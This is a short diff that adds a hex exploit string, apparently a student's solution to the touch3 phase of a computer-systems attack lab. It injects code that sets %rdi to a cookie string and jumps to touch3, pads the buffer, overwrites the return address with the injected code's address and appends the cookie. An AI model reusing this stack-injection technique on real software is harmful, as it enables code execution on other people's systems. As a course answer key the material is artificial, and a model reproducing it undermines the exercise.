@@ -1,0 +1,8 @@
+68 26 18 40 00 /* pushq touch3_start_address */
+48 c7 c7 e8 f8 65 55 /* mov string start address,%rdi */
+c3 /* retq */
+00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00
+b8 f8 65 55 00 00 00 00 /* binary code start address */
+31 64 32 36 65 32 39 36 00 /* cookie_string + null */
